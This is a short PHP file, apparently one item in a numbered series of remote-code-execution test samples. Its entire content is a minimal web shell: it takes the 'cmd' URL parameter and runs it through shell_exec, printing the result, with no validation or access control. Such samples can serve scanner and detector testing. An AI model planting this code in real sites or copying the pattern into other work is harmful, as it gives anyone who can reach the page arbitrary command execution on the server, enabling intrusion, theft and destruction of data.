<?php
// RCE test variation #319
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>